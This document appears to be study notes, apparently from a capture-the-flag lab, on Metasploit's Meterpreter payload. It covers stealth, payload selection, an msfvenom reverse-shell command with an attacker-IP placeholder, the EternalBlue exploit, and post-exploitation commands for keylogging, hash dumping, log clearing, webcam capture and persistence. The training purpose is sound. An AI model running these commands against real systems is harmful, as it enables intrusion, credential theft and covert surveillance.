**Introduction to Meterpreter**

Meterpreter is a versatile payload within Metasploit, designed to enhance the penetration testing process. Acting as an agent within a command-and-control framework, Meterpreter provides specialized commands to interact with the target operating system, files, and more. It operates without being explicitly installed on the target system, running stealthily in memory.


### **How Does Meterpreter Work?**

1. **Memory-Based Execution**  
   Meterpreter runs in the system's memory (RAM) instead of being written to disk. This reduces the chances of detection by antivirus software, which primarily scans files on disk.

2. **Stealth Features**  
   - Meterpreter appears as a legitimate process, avoiding direct identification (e.g., no `meterpreter.exe` or `meterpreter.dll` on the target).
   - Encrypted communication (e.g., TLS) between the target and the attacker prevents detection by network-based IPS/IDS solutions unless encrypted traffic is decrypted and inspected.

3. **Process Identification**  
   - The `getpid` command identifies the process ID (PID) under which Meterpreter is running.  
   - The `ps` command lists processes on the target machine. For instance, in the provided example, Meterpreter runs under the process `spoolsv.exe` with PID 1304, appearing as a legitimate system process.


### **Commands and Observations**

- **`getpid` Command**  
  Displays the PID of the process running Meterpreter.  
  Example:  
  ```
  meterpreter > getpid  
  Current pid: 1304  
  ```

- **`ps` Command**  
  Lists all processes on the target system, revealing that PID 1304 corresponds to `spoolsv.exe`.  
  Example:  
  ```
  meterpreter > ps  
  ```

- **Inspecting DLLs**  
  Even if DLLs loaded by the process are inspected, nothing indicates Meterpreter's presence, enhancing stealth.

- **Process Details**  
  Using `tasklist /m /fi "pid eq 1304"`, the DLLs associated with the process (e.g., `spoolsv.exe`) can be viewed. However, these DLLs appear legitimate, further concealing Meterpreter's activity.


### **Key Features**

1. **Stealth Operations**  
   Meterpreter disguises itself by blending with legitimate processes and avoids writing identifiable files to disk.

2. **Encrypted Communication**  
   Communication between Meterpreter and the attacker's system is encrypted, reducing detection by network security tools.

3. **Detection Limitations**  
   While stealthy, most antivirus solutions can still detect Meterpreter. However, techniques to detect it are beyond the scope of this discussion.

---
---


The **Meterpreter Flavors** topic is essential to understand the variety of payloads we can use in Metasploit based on the target system, available components, and network conditions.


### **Payload Categories**
1. **Inline (Single)**:
   - Entire payload sent in one step.
2. **Staged**:
   - Divided into two steps: 
     1. Stager installed.
     2. Remaining payload fetched by the stager.

### **Meterpreter Versions**
The available Meterpreter payloads support various platforms:
- **Android**
- **Apple iOS**
- **Java**
- **Linux**
- **OSX**
- **PHP**
- **Python**
- **Windows**

#### Listing Available Meterpreter Payloads
Run the following to list them:
```bash
msfvenom --list payloads | grep meterpreter
```
Output example:
- **Android**: `android/meterpreter/reverse_tcp`
- **Linux**: `linux/x64/meterpreter_reverse_https`
- **Windows**: `windows/x64/meterpreter/bind_tcp`


### **Key Factors in Choosing Meterpreter Payload**
1. **Target OS**:
   - Identify whether the target is Android, Linux, Windows, etc.
2. **Target Components**:
   - Verify if components like Python, PHP, or Java are installed.
3. **Network Constraints**:
   - Consider connection options: raw TCP, HTTPS, IPv6, etc.


### **Exploits and Default Payloads**
Some exploits have pre-configured payloads:
- Example: `ms17_010_eternalblue`
  ```bash
  msf6 > use exploit/windows/smb/ms17_010_eternalblue
  [*] Using configured payload windows/x64/meterpreter/reverse_tcp
  ```

List compatible payloads for an exploit:
```bash
show payloads
```


### **Practical Command Examples**
- **Choose Payload**: 
  ```bash
  set payload windows/x64/meterpreter/reverse_tcp
  ```
- **Generate Standalone Payload**:
  ```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe -o payload.exe
  ```

---
---


### **Meterpreter Commands Overview**
Meterpreter commands are tools for interacting with the target system. They are grouped into categories and can be accessed using the `help` command.

#### **Core Commands**
- `background`: Backgrounds the session.
- `exit`: Terminates the session.
- `guid`: Displays the session GUID.
- `help`: Lists all available commands.
- `info`: Displays module information.
- `irb`: Opens an interactive Ruby shell.
- `load`: Loads Meterpreter extensions.
- `migrate`: Migrates Meterpreter to another process.
- `run`: Executes scripts or modules.
- `sessions`: Switch between active sessions.

#### **File System Commands**
- `cd`: Change directory.
- `ls`: List files in the current directory.
- `pwd`: Show the current working directory.
- `edit`: Edit a file.
- `cat`: Display file contents.
- `rm`: Delete a file.
- `search`: Search for files.
- `upload`: Upload files/directories.
- `download`: Download files/directories.

#### **Networking Commands**
- `arp`: Show ARP cache.
- `ifconfig`: Display network interfaces.
- `netstat`: Display network connections.
- `portfwd`: Forward a local port to a remote service.
- `route`: View/modify routing tables.

#### **System Commands**
- `clearev`: Clear event logs.
- `execute`: Run a command.
- `getpid`: Show current process ID.
- `getuid`: Show current user.
- `kill`: Terminate a process.
- `pkill`: Terminate processes by name.
- `ps`: List running processes.
- `reboot`: Reboot the target system.
- `shell`: Open a system shell.
- `shutdown`: Shut down the target system.
- `sysinfo`: Display system information.

#### **Other Commands**
- **Idle and Keystrokes:**
  - `idletime`: Check user idle time.
  - `keyscan_start`: Start keystroke capture.
  - `keyscan_dump`: Display captured keystrokes.
  - `keyscan_stop`: Stop keystroke capture.
  
- **Desktop Interaction:**
  - `screenshare`: Watch the desktop in real-time.
  - `screenshot`: Capture a screenshot.
  
- **Audio and Video:**
  - `record_mic`: Record microphone audio.
  - `webcam_list`: List webcams.
  - `webcam_snap`: Capture webcam snapshots.
  - `webcam_stream`: Stream webcam video.

- **Privilege Escalation:**
  - `getsystem`: Attempt privilege escalation.
  - `hashdump`: Dump the SAM database.


---
---


### **Post-Exploitation with Meterpreter Commands**


#### **1. Help Menu**
- **Command**: `help`
- Displays a list of all available Meterpreter commands.
  ```bash
  meterpreter > help
  ```


#### **2. Core Commands**
| Command       | Description                                                                 |
|---------------|-----------------------------------------------------------------------------|
| `background`  | Backgrounds the current session.                                           |
| `sessions -l` | Lists all active sessions.                                                 |
| `sessions -i <id>` | Interacts with a specific session.                                     |
| `exit`        | Exits the current session.                                                 |


#### **3. Check Privileges**
- **Command**: `getuid`
- Displays the user level of the Meterpreter session (e.g., SYSTEM or a standard user).
  ```bash
  meterpreter > getuid
  Server username: NT AUTHORITY\SYSTEM
  ```


#### **4. Process Management**
- **List Processes**
  - **Command**: `ps`
  - Displays running processes along with their PIDs and user contexts.
    ```bash
    meterpreter > ps
    ```

- **Migrate to Another Process**
  - **Command**: `migrate <PID>`
  - Moves the Meterpreter session to another process (e.g., for keylogging or persistence).
    ```bash
    meterpreter > migrate 716
    [*] Migration completed successfully.
    ```
  - **Note**: Avoid migrating from SYSTEM to a lower-privileged user to maintain privileges.


#### **5. Keylogging**
- **Commands**:
  - Start keylogger: `keyscan_start`
  - Stop keylogger: `keyscan_stop`
  - Dump captured keystrokes: `keyscan_dump`


#### **6. Dumping Password Hashes**
- **Command**: `hashdump`
- Extracts the SAM database hashes, which can be used for attacks like Pass-the-Hash or cracking passwords.
  ```bash
  meterpreter > hashdump
  Administrator:500:<LM Hash>:<NTLM Hash>:::
  ```


#### **7. Searching for Files**
- **Command**: `search -f <filename>`
- Locates specific files on the target system, useful for finding flags or configuration files.
  ```bash
  meterpreter > search -f flag2.txt
  Found 1 result...
      c:\Windows\System32\config\flag2.txt (34 bytes)
  ```


#### **8. Interactive Shell**
- **Command**: `shell`
- Opens a command shell on the target system.
  ```bash
  meterpreter > shell
  Microsoft Windows [Version 10.0.19042]
  C:\Windows\system32>
  ```
- To return to Meterpreter: Press `CTRL+Z`.


#### **9. Additional Commands**
| Command        | Description                                                    |
|----------------|----------------------------------------------------------------|
| `screenshot`   | Captures a screenshot of the target’s desktop.                 |
| `webcam_snap`  | Takes a snapshot using the target's webcam.                    |
| `download`     | Downloads a file from the target system to your local machine. |
| `upload`       | Uploads a file to the target system.                           |
| `shell`        | Opens a system command shell on the target.                    |
| `exit`         | Terminates the Meterpreter session.                            |


### **Tips for Effective Use**
1. **Maintain Persistence**:
   - Use `run persistence` to maintain access after the session ends.

2. **Privilege Escalation**:
   - If running as a standard user, use `getsystem` or search for exploits to escalate privileges.

3. **Stay Stealthy**:
   - Avoid heavy resource usage or suspicious activities to reduce detection chances.

4. **Document Everything**:
   - Take notes of commands, outputs, and discovered data during the session.
